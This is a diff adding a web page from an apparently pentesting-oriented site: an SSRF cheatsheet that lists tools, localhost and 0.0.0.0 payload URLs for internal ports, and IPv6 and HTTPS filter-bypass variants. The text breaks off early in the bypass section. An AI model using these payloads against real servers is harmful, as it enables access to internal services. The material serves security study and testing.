@@ -1,0 +1,2451 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="All about Server-Side Request Forgery techniques, methods, payloads, how/why/when they work.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Server-Side Request Forgery" />
+<meta property="og:description" content="All about Server-Side Request Forgery techniques, methods, payloads, how/why/when they work." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/server_side_request_forgery/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>Server-Side Request Forgery | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.afc3b3563d1884d85d5f5db04c9a930f7d7c354fdac44481534920d345015a5b.js" integrity="sha256-r8OzVj0YhNhdX12wTJqTD318NU/axESBU0kg00UBWls=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tryhackme_olympus/" class="">Olympus - TryHackMe Walkthrough</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/wordpress/" class="">Wordpress Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/office_attacks/" class="">Attacking Office</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/windows_dpapi/" class="">Microsoft Window&#39;s Data Protection API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_discovery/" class="">Network Discovery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/source_code_management/" class="">Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/java_rmi/" class="">Java RMI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/oauth/" class="">OAuth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/race_conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/saml_injection/" class="">SAML Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_request_forgery/" class="active">Server-Side Request Forgery</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/sql_injection/" class="">SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/type_juggling/" class="">Type Juggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/xss_injection/" class="">XSS Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Server-Side Request Forgery</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#server-side-request-forgery">Server-Side Request Forgery</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#payloads-with-localhost">Payloads with localhost</a></li>
+        <li><a href="#bypassing-filters">Bypassing filters</a>
+          <ul>
+            <li><a href="#bypass-using-https">Bypass using HTTPS</a></li>
+            <li><a href="#bypass-localhost-with-">Bypass localhost with [::]</a></li>
+            <li><a href="#bypass-localhost-with-a-domain-redirection">Bypass localhost with a domain redirection</a></li>
+            <li><a href="#bypass-localhost-with-cidr">Bypass localhost with CIDR</a></li>
+            <li><a href="#bypass-using-a-decimal-ip-location">Bypass using a decimal IP location</a></li>
+            <li><a href="#bypass-using-octal-ip">Bypass using octal IP</a></li>
+            <li><a href="#bypass-using-ipv6ipv4-address-embedding">Bypass using IPv6/IPv4 Address Embedding</a></li>
+            <li><a href="#bypass-using-malformed-urls">Bypass using malformed urls</a></li>
+            <li><a href="#bypass-using-rare-address">Bypass using rare address</a></li>
+            <li><a href="#bypass-using-url-encoding">Bypass using URL encoding</a></li>
+            <li><a href="#bypass-using-bash-variables">Bypass using bash variables</a></li>
+            <li><a href="#bypass-using-tricks-combination">Bypass using tricks combination</a></li>
+            <li><a href="#bypass-using-enclosed-alphanumerics">Bypass using enclosed alphanumerics</a></li>
+            <li><a href="#bypass-using-unicode">Bypass using unicode</a></li>
+            <li><a href="#bypass-filter_var-php-function">Bypass filter_var() php function</a></li>
+            <li><a href="#bypass-against-a-weak-parser">Bypass against a weak parser</a></li>
+            <li><a href="#bypassing-using-a-redirect">Bypassing using a redirect</a></li>
+            <li><a href="#bypassing-using-typeurl">Bypassing using type=url</a></li>
+            <li><a href="#bypassing-using-dns-rebinding-toctou">Bypassing using DNS Rebinding (TOCTOU)</a></li>
+            <li><a href="#bypassing-using-jar-protocol-java-only">Bypassing using jar protocol (java only)</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssrf-exploitation-via-url-scheme">SSRF exploitation via URL Scheme</a>
+          <ul>
+            <li><a href="#file">File</a></li>
+            <li><a href="#http">HTTP</a></li>
+            <li><a href="#dict">Dict</a></li>
+            <li><a href="#sftp">SFTP</a></li>
+            <li><a href="#tftp">TFTP</a></li>
+            <li><a href="#ldap">LDAP</a></li>
+            <li><a href="#gopher">Gopher</a></li>
+            <li><a href="#netdoc">Netdoc</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssrf-exploiting-wsgi">SSRF exploiting WSGI</a></li>
+        <li><a href="#ssrf-exploiting-redis">SSRF exploiting Redis</a></li>
+        <li><a href="#ssrf-exploiting-pdf-file">SSRF exploiting PDF file</a></li>
+        <li><a href="#blind-ssrf">Blind SSRF</a></li>
+        <li><a href="#ssrf-to-xss">SSRF to XSS</a></li>
+        <li><a href="#ssrf-from-xss">SSRF from XSS</a>
+          <ul>
+            <li><a href="#using-an-iframe">Using an iframe</a></li>
+            <li><a href="#using-an-attachment">Using an attachment</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssrf-url-for-cloud-instances">SSRF URL for Cloud Instances</a>
+          <ul>
+            <li><a href="#ssrf-url-for-aws-bucket">SSRF URL for AWS Bucket</a></li>
+            <li><a href="#ssrf-url-for-aws-ecs">SSRF URL for AWS ECS</a></li>
+            <li><a href="#ssrf-url-for-aws-elastic-beanstalk">SSRF URL for AWS Elastic Beanstalk</a></li>
+            <li><a href="#ssrf-url-for-aws-lambda">SSRF URL for AWS Lambda</a></li>
+            <li><a href="#ssrf-url-for-google-cloud">SSRF URL for Google Cloud</a></li>
+            <li><a href="#ssrf-url-for-digital-ocean">SSRF URL for Digital Ocean</a></li>
+            <li><a href="#ssrf-url-for-packetcloud">SSRF URL for Packetcloud</a></li>
+            <li><a href="#ssrf-url-for-azure">SSRF URL for Azure</a></li>
+            <li><a href="#ssrf-url-for-openstackrackspace">SSRF URL for OpenStack/RackSpace</a></li>
+            <li><a href="#ssrf-url-for-hp-helion">SSRF URL for HP Helion</a></li>
+            <li><a href="#ssrf-url-for-oracle-cloud">SSRF URL for Oracle Cloud</a></li>
+            <li><a href="#ssrf-url-for-alibaba">SSRF URL for Alibaba</a></li>
+            <li><a href="#ssrf-url-for-kubernetes-etcd">SSRF URL for Kubernetes ETCD</a></li>
+            <li><a href="#ssrf-url-for-docker">SSRF URL for Docker</a></li>
+            <li><a href="#ssrf-url-for-rancher">SSRF URL for Rancher</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="server-side-request-forgery">
+  Server-Side Request Forgery
+  <a class="anchor" href="#server-side-request-forgery">#</a>
+</h1>
+<blockquote>
+<p>Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.</p>
+</blockquote>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap - https://github.com/swisskyrepo/SSRFmap</a></li>
+<li>
+  <a href="https://github.com/tarunkant/Gopherus">Gopherus - https://github.com/tarunkant/Gopherus</a></li>
+<li>
+  <a href="https://github.com/In3tinct/See-SURF">See-SURF - https://github.com/In3tinct/See-SURF</a></li>
+<li>
+  <a href="https://github.com/teknogeek/ssrf-sheriff">SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff</a></li>
+</ul>
+<h2 id="payloads-with-localhost">
+  Payloads with localhost
+  <a class="anchor" href="#payloads-with-localhost">#</a>
+</h2>
+<p>Basic SSRF v1</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0.0</span>.0.<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0.0</span>.0.<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0.0</span>.0.<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span>
+</span></span></code></pre></div><p>Basic SSRF - Alternative version</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//localhost<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span>
+</span></span></code></pre></div><h2 id="bypassing-filters">
+  Bypassing filters
+  <a class="anchor" href="#bypassing-filters">#</a>
+</h2>
+<h3 id="bypass-using-https">
+  Bypass using HTTPS
+  <a class="anchor" href="#bypass-using-https">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>/
+</span></span><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//localhost/
+</span></span></code></pre></div><h3 id="bypass-localhost-with-">
+  Bypass localhost with [::]
+  <a class="anchor" href="#bypass-localhost-with-">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//[::]<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//[::]<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span>/ SMTP
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//[::]<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span>/ SSH
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//[::]<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">3128</span>/ Squid
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0000</span>::<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0000</span>::<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">25</span>/ SMTP
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0000</span>::<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span>/ SSH
